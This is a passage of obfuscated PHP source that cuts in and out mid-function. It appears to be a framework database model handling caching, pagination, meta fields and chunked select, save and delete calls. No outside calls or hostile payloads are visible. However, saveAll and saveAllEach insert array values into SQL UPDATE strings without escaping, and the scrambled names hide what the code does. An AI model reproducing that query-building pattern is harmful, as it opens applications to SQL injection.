= json_encode($›—¨›); $»Ó®€ëä = preg_replace_callback($ æüèïİ[436], function ($àø­Í¬Ã) { return $_SERVER[¡¬ıÜ ƒ][100]; }, $»Ó®€ëä); return json_decode($»Ó®€ëä); } public function setAutoIncrement($ùàÍ¤¹—) { $úöüÑ¥Ã = array($this->getPk() => $ùàÍ¤¹—); $Ú­ùí” = $this->data($úöüÑ¥Ã)->add(); if ($Ú­ùí”) { $this->delete($Ú­ùí”); } } public function getAutoIncrement() { $’ı­©à§ = $this->getTableName(); $³ÏÂìÒ¬ = $this->max($this->getPk()); $Š×‘ØÓû = $this->query("\x73\150\x6f\167\x20\x74\141\x62\154\145\40\x73\x74\141\x74\x75\x73\x20\167\150\x65\162\x65\x20\x4e\141\x6d\145\x3d\x27{$’ı­©à§}\47"); $‰À×¾“² = $Š×‘ØÓû[0][$_SERVER[¡¬ıÜ ƒ][437]]; $¦ğ¾ ş• = max($³ÏÂìÒ¬, $‰À×¾“²); return $¦ğ¾ ş•; } protected function _callBefore($Ä­‡ıŞ, $¯æ”üƒì) { return $this->cacheCallCheck($Ä­‡ıŞ, $¯æ”üƒì, !1); } protected function _callAfter($¢Ø¸Ö, $ÖÂªÁ) { return $this->cacheCallCheck($¢Ø¸Ö, $ÖÂªÁ, !0); } protected function cacheFunctionAlias($ı¡»äØÆ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($ùµª×¹û, $ªúÏ½¾, $½ñÏõ¼û = false) { $ëçÈïîÚ =& $_SERVER[¡¬ıÜ ƒ]; $–´´½˜Ñ = $this->cacheFunctionAlias($ªúÏ½¾); if (!$–´´½˜Ñ) { return; } foreach ($–´´½˜Ñ as $œÕÎä½é => $œÒÒìúœ) { $À“…Ë£ = $œÒÒìúœ[0]; $öŸëååó = explode($ëçÈïîÚ[50], $œÒÒìúœ[1]); $­¥™¾ø = isset($œÒÒìúœ[2]) ? $œÒÒìúœ[2] : $ëçÈïîÚ[12]; if ($ùµª×¹û == $œÕÎä½é) { return $this->cacheFunctionGet($œÕÎä½é, $À“…Ë£, $­¥™¾ø); } if ($½ñÏõ¼û && in_array($ùµª×¹û, $öŸëååó)) { $this->cacheFunctionClear($œÕÎä½é, $À“…Ë£, $­¥™¾ø); } } } public function cacheFunctionGet($Ğ…¢ßª£, $Ö­Ò¢è•, $…Ê†ç¦¿ = '') { $ÉÖ…«õ¾ = $this->cacheKeyMake($Ğ…¢ßª£, $Ö­Ò¢è•, $…Ê†ç¦¿); $ƒ³÷ŸÏ¼ = Cache::get($ÉÖ…«õ¾); if (!is_array($ƒ³÷ŸÏ¼)) { $ƒ³÷ŸÏ¼ = call_user_func_array(array($this, $Ğ…¢ßª£), array($Ö­Ò¢è•, !0)); Cache::set($ÉÖ…«õ¾, $ƒ³÷ŸÏ¼); } return $ƒ³÷ŸÏ¼; } public function cacheFunctionClear($Úı—ıÏå, $‹†ûº¡, $øˆ¯¬Õ = '') { $ÚÔÍ‡Ğş = $‹†ûº¡; if (!is_array($‹†ûº¡)) { $ÚÔÍ‡Ğş = array($‹†ûº¡); } foreach ($ÚÔÍ‡Ğş as $…›Çúñ) { $óæ¾Öó¤ = $this->cacheKeyMake($Úı—ıÏå, $…›Çúñ, $øˆ¯¬Õ); Cache::remove($óæ¾Öó¤); } } private function cacheKeyMake($Éæ·»ÅÑ, $Ö©‹ß¸, $•¯ˆ¥Ò„) { $Ôäøã”¬ =& $_SERVER[¡¬ıÜ ƒ]; if ($•¯ˆ¥Ò„) { $Ö©‹ß¸ = $Ö©‹ß¸ . $Ôäøã”¬[438] . $•¯ˆ¥Ò„; } return get_class($this) . $Ôäøã”¬[11] . $Éæ·»ÅÑ . $Ôäøã”¬[439] . $Ö©‹ß¸; } protected function selectPageReset() { $Ğİ ¾¾¥ =& $_SERVER[¡¬ıÜ ƒ]; if (isset($GLOBALS[$Ğİ ¾¾¥[440]])) { return; } $GLOBALS[$Ğİ ¾¾¥[440]] = isset($GLOBALS[$Ğİ ¾¾¥[7]][$Ğİ ¾¾¥[441]]) ? $GLOBALS[$Ğİ ¾¾¥[7]][$Ğİ ¾¾¥[441]] : !1; $GLOBALS[$Ğİ ¾¾¥[442]] = isset($GLOBALS[$Ğİ ¾¾¥[7]][$Ğİ ¾¾¥[430]]) ? $GLOBALS[$Ğİ ¾¾¥[7]][$Ğİ ¾¾¥[430]] : !1; $GLOBALS[$Ğİ ¾¾¥[7]][$Ğİ ¾¾¥[441]] = !1; $GLOBALS[$Ğİ ¾¾¥[7]][$Ğİ ¾¾¥[430]] = !1; } protected function selectPageRestore() { $ÊÈó‹Ù =& $_SERVER[¡¬ıÜ ƒ]; if (!isset($GLOBALS[$ÊÈó‹Ù[440]])) { return; } $GLOBALS[$ÊÈó‹Ù[7]][$ÊÈó‹Ù[441]] = $GLOBALS[$ÊÈó‹Ù[440]]; $GLOBALS[$ÊÈó‹Ù[7]][$ÊÈó‹Ù[430]] = $GLOBALS[$ÊÈó‹Ù[442]]; if ($GLOBALS[$ÊÈó‹Ù[7]][$ÊÈó‹Ù[441]] === !1) { unset($GLOBALS[$ÊÈó‹Ù[7]][$ÊÈó‹Ù[441]]); } if ($GLOBALS[$ÊÈó‹Ù[7]][$ÊÈó‹Ù[430]] === !1) { unset($GLOBALS[$ÊÈó‹Ù[7]][$ÊÈó‹Ù[430]]); } unset($GLOBALS[$ÊÈó‹Ù[440]]); unset($GLOBALS[$ÊÈó‹Ù[442]]); } protected function selectPage($Ï±æƒÜä = 200, $¥¹ğ¨Ùó = 1) { $êôü—Ê¿ =& $_SERVER[¡¬ıÜ ƒ]; global $in; $ğú˜ı´â = $this->optionsValue(); $–ÁÈá« = 50000; $Ï±æƒÜä = isset($in[$êôü—Ê¿[441]]) && $in[$êôü—Ê¿[441]] ? $in[$êôü—Ê¿[441]] : $Ï±æƒÜä; if ($Ï±æƒÜä === -1) { $in[$êôü—Ê¿[441]] = !1; $–ÁÈá« = 100000000; $Ï±æƒÜä = $–ÁÈá«; } $‡‰û¬Úİ = $ğú˜ı´â; $‡‰û¬Úİ[$êôü—Ê¿[443]] = array(); $Ï±æƒÜä = intval($Ï±æƒÜä); $Ï±æƒÜä = $Ï±æƒÜä <= 5 ? 5 : ($Ï±æƒÜä >= $–ÁÈá« ? $–ÁÈá« : $Ï±æƒÜä); $¥¹ğ¨Ùó = intval(isset($in[$êôü—Ê¿[430]]) && $in[$êôü—Ê¿[430]] ? $in[$êôü—Ê¿[430]] : $¥¹ğ¨Ùó); $¥¹ğ¨Ùó = $¥¹ğ¨Ùó <= 1 ? 1 : $¥¹ğ¨Ùó; $õÁ¨ö¯ = array(); $—¯Ëó¨ˆ = 1; if ($¥¹ğ¨Ùó == 1 && $—¯Ëó¨ˆ) { $this->optionsValue($ğú˜ı´â); $õÁ¨ö¯ = $this->page($¥¹ğ¨Ùó, $Ï±æƒÜä)->select(); $Ó½ÖÎşë = is_array($õÁ¨ö¯) ? count($õÁ¨ö¯) : 0; if ($Ó½ÖÎşë < $Ï±æƒÜä) { $‹Èıœ¥Ô = 1; } else { $this->optionsValue($‡‰û¬Úİ); $Ó½ÖÎşë = intval($this->count()); $‹Èıœ¥Ô = ceil($Ó½ÖÎşë / $Ï±æƒÜä); } } else { $this->optionsValue($‡‰û¬Úİ); $Ó½ÖÎşë = intval($this->count()); $‹Èıœ¥Ô = ceil($Ó½ÖÎşë / $Ï±æƒÜä); $¥¹ğ¨Ùó = $¥¹ğ¨Ùó >= $‹Èıœ¥Ô ? $‹Èıœ¥Ô : $¥¹ğ¨Ùó; $this->optionsValue($ğú˜ı´â); $õÁ¨ö¯ = $this->page($¥¹ğ¨Ùó, $Ï±æƒÜä)->select(); } if (!is_array($õÁ¨ö¯)) { $õÁ¨ö¯ = array(); } if ($‹Èıœ¥Ô == 1) { $Ó½ÖÎşë = count($õÁ¨ö¯); } $¦üëƒ¸ = array($êôü—Ê¿[444] => array($êôü—Ê¿[445] => $Ó½ÖÎşë, $êôü—Ê¿[441] => $Ï±æƒÜä, $êôü—Ê¿[430] => $¥¹ğ¨Ùó, $êôü—Ê¿[446] => $‹Èıœ¥Ô), $êôü—Ê¿[447] => $õÁ¨ö¯); return $¦üëƒ¸; } protected function checkLength($¼Ó‹Ò”, $×‘«ƒ±ç = 0, $«¨ÓÇÔÌ = '') { $Ñà¢Ş‚ =& $_SERVER[¡¬ıÜ ƒ]; $×‘«ƒ±ç = $×‘«ƒ±ç ? $×‘«ƒ±ç : 65536; if (!$¼Ó‹Ò” || strlen($¼Ó‹Ò”) < $×‘«ƒ±ç) { return; } $«¨ÓÇÔÌ = $«¨ÓÇÔÌ ? $«¨ÓÇÔÌ . $Ñà¢Ş‚[74] : $Ñà¢Ş‚[12]; show_json($«¨ÓÇÔÌ . LNG($Ñà¢Ş‚[448]) . "\50{$×‘«ƒ±ç}\51", !1); } protected function metaSet($ÚÜ×Âàâ, $ı½¯”Ïà = null, $Ô‚àİêå = null) { $ò³Ğ®›ú =& $_SERVER[¡¬ıÜ ƒ]; if (!$this->tableMeta || !$ÚÜ×Âàâ) { return !1; } $ÈÈÚ“áê = $this->tableMeta[$ò³Ğ®›ú[449]]; $»äÇÎ€ä = $this->tableMeta[$ò³Ğ®›ú[450]]; $œ™×üôÆ = Model($»äÇÎ€ä); $ûŞ¾ùà = array($ÈÈÚ“áê => $ÚÜ×Âàâ, $ò³Ğ®›ú[451] => $ı½¯”Ïà); if (is_null($ı½¯”Ïà)) { return $œ™×üôÆ->where(array($ÈÈÚ“áê => $ÚÜ×Âàâ))->delete(); } if (is_null($Ô‚àİêå) && is_string($ı½¯”Ïà)) { return $œ™×üôÆ->where($ûŞ¾ùà)->delete(); } $âÈÏÀÌÈ = is_array($ı½¯”Ïà) ? $ı½¯”Ïà : array(); if (is_string($ı½¯”Ïà)) { $âÈÏÀÌÈ[$ı½¯”Ïà] = $Ô‚àİêå; } $÷—´ = array(); foreach ($âÈÏÀÌÈ as $•¿Í’×½ => $ŠŞä¢–—) { if (is_null($ŠŞä¢–—) && is_string($•¿Í’×½)) { $œ™×üôÆ->where(array($ÈÈÚ“áê => $ÚÜ×Âàâ, $ò³Ğ®›ú[451] => $•¿Í’×½))->delete(); continue; } $this->checkLength($ŠŞä¢–—, !1, $»äÇÎ€ä . $ò³Ğ®›ú[4] . $•¿Í’×½); $÷—´[] = array($ÈÈÚ“áê => $ÚÜ×Âàâ, $ò³Ğ®›ú[97] => $•¿Í’×½, $ò³Ğ®›ú[452] => $ŠŞä¢–—); } $µÎ²äë = $ò³Ğ®›ú[453] . $»äÇÎ€ä; CacheLock::lock($µÎ²äë); $œ™×üôÆ->where(array($ÈÈÚ“áê => $ÚÜ×Âàâ))->addAll($÷—´, array(), !0); CacheLock::unlock($µÎ²äë); return !0; } public function metaGet($Ôµı¢•®, $ëÔÓ¶›× = false) { $á»•áë =& $_SERVER[¡¬ıÜ ƒ]; if (!$this->tableMeta) { return array(); } $™¦³‘ µ = $this->tableMeta[$á»•áë[449]]; $ŒŒ¤¬¿« = Model($this->tableMeta[$á»•áë[450]]); if ($ëÔÓ¶›×) { $•ÅÈâÍ = array($™¦³‘ µ => $Ôµı¢•®, $á»•áë[97] => $ëÔÓ¶›×); return $ŒŒ¤¬¿«->where($•ÅÈâÍ)->getField($á»•áë[452]); } $•ÅÈâÍ = array($™¦³‘ µ => $Ôµı¢•®); $†÷¬¸Ûä = $ŒŒ¤¬¿«->field($á»•áë[454])->where($•ÅÈâÍ)->select(); $†÷¬¸Ûä = array_to_keyvalue($†÷¬¸Ûä, $á»•áë[97], $á»•áë[452]); return $†÷¬¸Ûä; } private function checkDataAutoHas($ğÊ—«´×) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $îÌ¬‰ñØ) { if (in_array($ğÊ—«´×, explode($_SERVER[¡¬ıÜ ƒ][50], $îÌ¬‰ñØ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$‚ì´¥„ú, $Éº¾ñí) { $ğõóÔîÔ =& $_SERVER[¡¬ıÜ ƒ]; if (!is_array($‚ì´¥„ú)) { return; } foreach ($this->dataAuto as $…ØŞ»Ó) { $ôèéæï = $…ØŞ»Ó[0]; if (!in_array($Éº¾ñí, explode($ğõóÔîÔ[50], $…ØŞ»Ó[2]))) { continue; } switch (trim($…ØŞ»Ó[3])) { case $ğõóÔîÔ[398]: case $ğõóÔîÔ[399]: $ôÌ†éïç = $…ØŞ»Ó[1]; $×„†œ„ = isset($…ØŞ»Ó[4]) ? (array) $…ØŞ»Ó[4] : array(); if ($ôÌ†éïç == $ğõóÔîÔ[206] && array_key_exists($ôèéæï, $‚ì´¥„ú)) { if (!$‚ì´¥„ú[$ôèéæï]) { unset($‚ì´¥„ú[$ôèéæï]); } break; } if (isset($‚ì´¥„ú[$ôèéæï])) { array_unshift($×„†œ„, $‚ì´¥„ú[$ôèéæï]); } if ($ğõóÔîÔ[398] == $…ØŞ»Ó[3]) { $‚ì´¥„ú[$ôèéæï] = call_user_func_array($ôÌ†éïç, $×„†œ„); } else { $‚ì´¥„ú[$ôèéæï] = call_user_func_array(array(&$this, $ôÌ†éïç), $×„†œ„); } break; case $ğõóÔîÔ[349]: if (isset($‚ì´¥„ú[$ôèéæï]) && $‚ì´¥„ú[$ôèéæï]) { $‚ì´¥„ú[$ôèéæï] = call_user_func_array(array(&$this, $…ØŞ»Ó[1]), array($‚ì´¥„ú[$ôèéæï])); } break; case $ğõóÔîÔ[352]: $‚ì´¥„ú[$ôèéæï] = $‚ì´¥„ú[$…ØŞ»Ó[1]]; break; case $ğõóÔîÔ[371]: if (isset($‚ì´¥„ú[$ôèéæï]) && !is_string($‚ì´¥„ú[$ôèéæï])) { $‚ì´¥„ú[$ôèéæï] = json_encode_force($‚ì´¥„ú[$ôèéæï]); } break; case $ğõóÔîÔ[400]: if ($‚ì´¥„ú[$ôèéæï] === $ğõóÔîÔ[12]) { unset($‚ì´¥„ú[$ôèéæï]); } break; case $ğõóÔîÔ[401]: $‚ì´¥„ú[$ôèéæï] = $…ØŞ»Ó[1]; default: break; } } if ($Éº¾ñí == $ğõóÔîÔ[432]) { $¢Ö™§ûÏ = strtolower($this->db->getDbType()); if (strpos($¢Ö™§ûÏ, $ğõóÔîÔ[13]) !== 0) { return; } $øüËÆÆ = $this->field(!0)->fields; $Õı·³Å‡ = $øüËÆÆ[$ğõóÔîÔ[331]]; if (isset($øüËÆÆ[$ğõóÔîÔ[330]])) { unset($Õı·³Å‡[$øüËÆÆ[$ğõóÔîÔ[330]]]); } foreach ($Õı·³Å‡ as $šÆÛıÀ => $Éº¾ñí) { if (!isset($‚ì´¥„ú[$šÆÛıÀ])) { $‚ì´¥„ú[$šÆÛıÀ] = $ğõóÔîÔ[12]; } } } } private function dataAfterFilter(&$‹©£éÇè) { $âşœ›ãî =& $_SERVER[¡¬ıÜ ƒ]; foreach ($this->dataAuto as $Ê×“ÉÙ½) { $ƒùóËìŸ = $Ê×“ÉÙ½[0]; if (!isset($‹©£éÇè[$ƒùóËìŸ])) { continue; } if (!in_array($âşœ›ãî[434], explode($âşœ›ãî[50], $Ê×“ÉÙ½[2]))) { continue; } switch (trim($Ê×“ÉÙ½[3])) { case $âşœ›ãî[398]: case $âşœ›ãî[399]: $˜æ’Ø‰ = isset($Ê×“ÉÙ½[4]) ? (array) $Ê×“ÉÙ½[4] : array(); array_unshift($˜æ’Ø‰, $‹©£éÇè[$ƒùóËìŸ]); if (isset($Ê×“ÉÙ½[4]) && $Ê×“ÉÙ½[4] == $âşœ›ãî[455]) { $˜æ’Ø‰ = array($‹©£éÇè[$ƒùóËìŸ]); } if ($âşœ›ãî[398] == $Ê×“ÉÙ½[3]) { $‹©£éÇè[$ƒùóËìŸ] = call_user_func_array($Ê×“ÉÙ½[1], $˜æ’Ø‰); } else { $‹©£éÇè[$ƒùóËìŸ] = call_user_func_array(array(&$this, $Ê×“ÉÙ½[1]), $˜æ’Ø‰); } break; case $âşœ›ãî[349]: if (isset($‹©£éÇè[$ƒùóËìŸ]) && $‹©£éÇè[$ƒùóËìŸ]) { $‹©£éÇè[$ƒùóËìŸ] = call_user_func_array(array(&$this, $Ê×“ÉÙ½[1]), array($‹©£éÇè[$ƒùóËìŸ])); } break; case $âşœ›ãî[352]: $‹©£éÇè[$ƒùóËìŸ] = $‹©£éÇè[$Ê×“ÉÙ½[1]]; break; case $âşœ›ãî[371]: $ô–¡™†­ = $‹©£éÇè[$ƒùóËìŸ]; $‹©£éÇè[$ƒùóËìŸ] = json_decode($ô–¡™†­, !0); if (is_null($‹©£éÇè[$ƒùóËìŸ])) { $‹©£éÇè[$ƒùóËìŸ] = $ô–¡™†­; } break; case $âşœ›ãî[400]: if ($‹©£éÇè[$ƒùóËìŸ] === $âşœ›ãî[12]) { unset($‹©£éÇè[$ƒùóËìŸ]); } break; case $âşœ›ãî[401]: $‹©£éÇè[$ƒùóËìŸ] = $Ê×“ÉÙ½[1]; break; default: break; } } } public function saveAll($õ¦“Õ×è) { $ÏüÌ•££ =& $_SERVER[¡¬ıÜ ƒ]; $êö«¬œ = $this->tablePrefix . $this->tableName; $±şõ”‚ = self::SQL_WHERE_IN_CHUNK; $õ¦“Õ×è = is_array($õ¦“Õ×è) ? $õ¦“Õ×è : array(); $ã¯¿í¥µ = $ÏüÌ•££[456]; $øÏ•Íì² = 0; $ÖìÛ²ïç = array(); $ü‚é¾Û€ = count($õ¦“Õ×è); for ($±ÕÕÒâ = 0; $±ÕÕÒâ < $ü‚é¾Û€; $±ÕÕÒâ++) { $ãÚ¬’«Á = $õ¦“Õ×è[$±ÕÕÒâ]; if (!is_array($ãÚ¬’«Á) || count($ãÚ¬’«Á) != 4) { continue; } $šÀô‡ø = "\125\x50\x44\x41\124\x45\x20\x60{$êö«¬œ}\140\40\123\105\124\x20{$ãÚ¬’«Á[2]}\x20\x3d\x20\103\101\x53\x45\x20{$ãÚ¬’«Á[0]}\40\12"; if ($øÏ•Íì² == 0) { $ã¯¿í¥µ = $šÀô‡ø; } $ÖìÛ²ïç[] = $ÏüÌ•££[121] . $ãÚ¬’«Á[1] . $ÏüÌ•££[121]; $øÏ•Íì²++; $ã¯¿í¥µ .= "\x20\127\x48\x45\x4e\x20\47{$ãÚ¬’«Á[1]}\x27\40\124\110\105\x4e\40\x27{$ãÚ¬’«Á[3]}\47\x20\xa"; if ($øÏ•Íì² == $±şõ”‚ || $±ÕÕÒâ == $ü‚é¾Û€ - 1) { $³§¢’Ùò = implode($ÏüÌ•££[50], $ÖìÛ²ïç); $ã¯¿í¥µ .= "\40\x45\x4e\104\x20\x20\x57\110\105\122\x45\x20{$ãÚ¬’«Á[0]}\x20\x49\x4e\x20\x28{$³§¢’Ùò}\x29\x20"; $this->execute($ã¯¿í¥µ); $øÏ•Íì² = 0; $ã¯¿í¥µ = $šÀô‡ø; $this->chunkEventCheck(count($ÖìÛ²ïç)); $ÖìÛ²ïç = array(); } } $this->chunkEventSet(); } public function saveAllEach($Õ›”˜Ò‘) { $Ù¸ºÜÊ« =& $_SERVER[¡¬ıÜ ƒ]; $Åæœ¸Ñ¸ = $this->tablePrefix . $this->tableName; foreach ($Õ›”˜Ò‘ as $ŒäíîÚ²) { if (!is_array($ŒäíîÚ²) || count($ŒäíîÚ²) != 4) { continue; } $¼¨×Á…Í = $ŒäíîÚ²[0] . $Ù¸ºÜÊ«[457] . $ŒäíîÚ²[1] . $Ù¸ºÜÊ«[121]; $¿¢¶ª· = $ŒäíîÚ²[2] . $Ù¸ºÜÊ«[457] . $ŒäíîÚ²[3] . $Ù¸ºÜÊ«[121]; $­Ä‘¤”™ = "\165\160\144\x61\164\145\40{$Åæœ¸Ñ¸}\x20\x73\145\x74\40{$¿¢¶ª·}\x20\167\150\x65\x72\x65\40{$¼¨×Á…Í}\73"; $this->execute($­Ä‘¤”™); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($ÍØÀæ¿« = false, $áú‹°İ = false) { $this->_chunkEvent = $ÍØÀæ¿«; $this->_chunkEventParam = $áú‹°İ; } private function chunkEventCheck($ÓÉ®¼Ÿ) { if (!$this->_chunkEvent) { return; } $£¾‚úÛ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $£¾‚úÛ[$_SERVER[¡¬ıÜ ƒ][458]] = $ÓÉ®¼Ÿ; Hook::trigger($this->_chunkEvent, $£¾‚úÛ); } public function addAll($ú™”ÙÌ, $Ş¤™ëÈ¹ = array(), $ãÚóå‹ = false) { $âÍüÀå× =& $_SERVER[¡¬ıÜ ƒ]; ignore_timeout(); $Ûåìáî¯ = self::SQL_WHERE_IN_CHUNK; if (empty($ú™”ÙÌ)) { $this->error = think_lang($âÍüÀå×[350]); return !1; } $Ş¤™ëÈ¹ = $this->_parseOptions($Ş¤™ëÈ¹); foreach ($ú™”ÙÌ as $›¼•Š¿ => $Ë¼™ ®’) { $ú™”ÙÌ[$›¼•Š¿] = $this->_facade($Ë¼™ ®’); $this->_beforeInsert($ú™”ÙÌ[$›¼•Š¿], $Ş¤™ëÈ¹); } if (method_exists($this->db, $âÍüÀå×[351])) { for ($Ë…´­Ğï = 0; $Ë…´­Ğï < count($ú™”ÙÌ); $Ë…´­Ğï += $Ûåìáî¯) { $ëöÖƒ±Ô = array_slice($ú™”ÙÌ, $Ë…´­Ğï, $Ûåìáî¯); if (!is_array($ëöÖƒ±Ô) || count($ëöÖƒ±Ô) == 0) { break; } $İíÍáÓæ = $this->db->insertAll($ëöÖƒ±Ô, $Ş¤™ëÈ¹, $ãÚóå‹); $this->chunkEventCheck(count($ëöÖƒ±Ô)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($ú™”ÙÌ as $›¼•Š¿ => $Ë¼™ ®’) { $İíÍáÓæ = $this->db->insert($Ë¼™ ®’, $Ş¤™ëÈ¹, $ãÚóå‹); } $this->commit(); } if (!1 !== $İíÍáÓæ) { $ÕÚ¢‹Ğ‚ = $this->getLastInsID(); if ($ÕÚ¢‹Ğ‚) { return $ÕÚ¢‹Ğ‚; } } return $İíÍáÓæ; } public function save($Ñí”Íœ = '', $»¼‘ÑÌ‚ = array()) { $—½‰‰éø =& $_SERVER[¡¬ıÜ ƒ]; $ğ¢İÊ‡¨ = self::SQL_WHERE_IN_CHUNK; $²‰¢—¨¯ = $this->optionsValue(); $à„ğş² = $this->findWhereField($²‰¢—¨¯); if (!$à„ğş²) { return parent::save($Ñí”Íœ, $»¼‘ÑÌ‚); } $¥ôäĞÅô = 0; $à»É³¾Û = $²‰¢—¨¯[$—½‰‰éø[354]][$à„ğş²][1]; $à»É³¾Û = is_array($à»É³¾Û) ? $à»É³¾Û : array(); $ğ±Î£¤ = count($à»É³¾Û); for ($Ùç—Ùƒ™ = 0; $Ùç—Ùƒ™ < $ğ±Î£¤; $Ùç—Ùƒ™ += $ğ¢İÊ‡¨) { $øÑß°‰ú = array_slice($à»É³¾Û, $Ùç—Ùƒ™, $ğ¢İÊ‡¨); if (!is_array($øÑß°‰ú) || count($øÑß°‰ú) == 0) { break; } $²‰¢—¨¯[$—½‰‰éø[354]][$à„ğş²][1] = $øÑß°‰ú; $this->optionsValue($²‰¢—¨¯); $¥ôäĞÅô += parent::save($Ñí”Íœ, $»¼‘ÑÌ‚); $this->chunkEventCheck(count($øÑß°‰ú)); } $this->chunkEventSet(); return $¥ôäĞÅô; } public function add($ßää‹ôë = '', $øºÆêÜŸ = array(), $¸Ïİ¤µ¢ = false) { if ($this->addTaskStatus && is_array($ßää‹ôë)) { $this->addTaskData[] = $ßää‹ôë; return; } return parent::add($ßää‹ôë, $øºÆêÜŸ, $¸Ïİ¤µ¢); } public function parseWhereLike($í×Á£”, $Äú¥™õù = '', $€ÁÑì¡Í = false, &$È€±¡©ß = false) { $ÑŒ«ŞÀÑ =& $_SERVER[¡¬ıÜ ƒ]; $ºá«Ó¢ = $GLOBALS[$ÑŒ«ŞÀÑ[6]][$ÑŒ«ŞÀÑ[459]]; if (!$ºá«Ó¢[$ÑŒ«ŞÀÑ[460]]) { return $í×Á£”; } if (!is_array($í×Á£”)) { return $í×Á£”; } $ø”£Ï¶Ú = array(); $÷—¹Ã“¦ = 0; foreach ($í×Á£” as $ıù·¹ğÃ => $ ±˜ÜÊ©) { if (is_array($ ±˜ÜÊ©) && count($ ±˜ÜÊ©) == 2 && $ ±˜ÜÊ©[0] == $ÑŒ«ŞÀÑ[461] && is_string($ ±˜ÜÊ©[1]) && substr($ ±˜ÜÊ©[1], 0, 1) == $ÑŒ«ŞÀÑ[462] && substr($ ±˜ÜÊ©[1], strlen($ ±˜ÜÊ©[1]) - 1, 1) == $ÑŒ«ŞÀÑ[462]) { $È€±¡©ß = !0; $§‡§¾¯Ñ = is_string($ıù·¹ğÃ) ? $ıù·¹ğÃ : $Äú¥™õù; $Æ–û÷×Ô = substr($ ±˜ÜÊ©[1], 1, strlen($ ±˜ÜÊ©[1]) - 2); $Æ–û÷×Ô = $this->db->escapeString($Æ–û÷×Ô); if (!strpos($§‡§¾¯Ñ, $ÑŒ«ŞÀÑ[10])) { $§‡§¾¯Ñ = $ÑŒ«ŞÀÑ[463] . $§‡§¾¯Ñ . $ÑŒ«ŞÀÑ[463]; } $õ†¦ŠÊ¡ = $ÑŒ«ŞÀÑ[222] . $Æ–û÷×Ô . $ÑŒ«ŞÀÑ[222]; $Æ–û÷×Ô = str_replace(array($ÑŒ«ŞÀÑ[10], $ÑŒ«ŞÀÑ[464], $ÑŒ«ŞÀÑ[11]), $ÑŒ«ŞÀÑ[465], $Æ–û÷×Ô); if ($ºá«Ó¢[$ÑŒ«ŞÀÑ[466]]) { $õ†¦ŠÊ¡ = $ÑŒ«ŞÀÑ[467] . $Æ–û÷×Ô . $ÑŒ«ŞÀÑ[468]; if ($ºá«Ó¢[$ÑŒ«ŞÀÑ[469]]) { $õ†¦ŠÊ¡ = $ÑŒ«ŞÀÑ[468] . $Æ–û÷×Ô . $ÑŒ«ŞÀÑ[467]; } } $ø”£Ï¶Ú[$÷—¹Ã“¦] = $ÑŒ«ŞÀÑ[470] . $§‡§¾¯Ñ . $ÑŒ«ŞÀÑ[471] . $õ†¦ŠÊ¡ . $ÑŒ«ŞÀÑ[472]; $÷—¹Ã“¦++; continue; } if (is_array($ ±˜ÜÊ©)) { $Äú¥™õù = is_string($ıù·¹ğÃ) ? $ıù·¹ğÃ : $Äú¥™õù; $ ±˜ÜÊ© = $this->parseWhereLike($ ±˜ÜÊ©, $Äú¥™õù, !0, $È€±¡©ß); } if (is_numeric($ıù·¹ğÃ)) { $ø”£Ï¶Ú[$÷—¹Ã“¦] = $ ±˜ÜÊ©; $÷—¹Ã“¦++; } else { $ø”£Ï¶Ú[$ıù·¹ğÃ] = $ ±˜ÜÊ©; } } if ($È€±¡©ß && !$€ÁÑì¡Í) { } return $ø”£Ï¶Ú; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($—ä€½ãú = array()) { $®‹Ñ¾›õ =& $_SERVER[¡¬ıÜ ƒ]; $ÉÌÜ‡¾ = self::SQL_WHERE_IN_CHUNK; $‡„®”²û = $this->optionsValue(); $Îú˜´öé = $this->findWhereField($‡„®”²û); if (!$Îú˜´öé || isset($‡„®”²û[$®‹Ñ¾›õ[369]]) || isset($‡„®”²û[$®‹Ñ¾›õ[430]])) { return parent::select($—ä€½ãú); } $ÃÃ°¢µÏ = $‡„®”²û[$®‹Ñ¾›õ[354]][$Îú˜´öé][1]; $ÃÃ°¢µÏ = is_array($ÃÃ°¢µÏ) ? $ÃÃ°¢µÏ : array(); $£‰ıôŒ¿ = null; for ($øŸÂ´¥ = 0; $øŸÂ´¥ < count($ÃÃ°¢µÏ); $øŸÂ´¥ += $ÉÌÜ‡¾) { $–ìÄ»‘æ = array_slice($ÃÃ°¢µÏ, $øŸÂ´¥, $ÉÌÜ‡¾); if (!is_array($–ìÄ»‘æ) || count($–ìÄ»‘æ) == 0) { break; } $‡„®”²û[$®‹Ñ¾›õ[354]][$Îú˜´öé][1] = $–ìÄ»‘æ; $this->optionsValue($‡„®”²û); $ú¦ªÌ× = parent::select($—ä€½ãú); if (!$ú¦ªÌ×) { continue; } $£‰ıôŒ¿ = is_array($£‰ıôŒ¿) ? $£‰ıôŒ¿ : array(); $£‰ıôŒ¿ = array_merge($£‰ıôŒ¿, $ú¦ªÌ×); } return $£‰ıôŒ¿; } public function delete($ÚõîÃÚ¾ = array()) { $ŒïÖıĞ£ =& $_SERVER[¡¬ıÜ ƒ]; $…‘ÑÅéÉ = self::SQL_WHERE_IN_CHUNK; $×›’ü¿î = $this->optionsValue(); $ìÍ¿âäı = $this->findWhereField($×›’ü¿î); if (!$ìÍ¿âäı) { return parent::delete($ÚõîÃÚ¾); } $’Šµ´Ã‹ = 0; $æâÌÃ = $×›’ü¿î[$ŒïÖıĞ£[354]][$ìÍ¿âäı][1]; $æâÌÃ = is_array($æâÌÃ) ? $æâÌÃ : array(); for ($è¨–æ‹¾ = 0; $è¨–æ‹¾ < count($æâÌÃ); $è¨–æ‹¾ += $…‘ÑÅéÉ) { $ıàµñ¢ = array_slice($æâÌÃ, $è¨–æ‹¾, $…‘ÑÅéÉ); if (!is_array($ıàµñ¢) || count($ıàµñ¢) == 0) { break; } $×›’ü¿î[$ŒïÖıĞ£[354]][$ìÍ¿âäı][1] = $ıàµñ¢; $this->optionsValue($×›’ü¿î); $’Šµ´Ã‹ += parent::delete($ÚõîÃÚ¾); } return $’Šµ´Ã‹; } private function 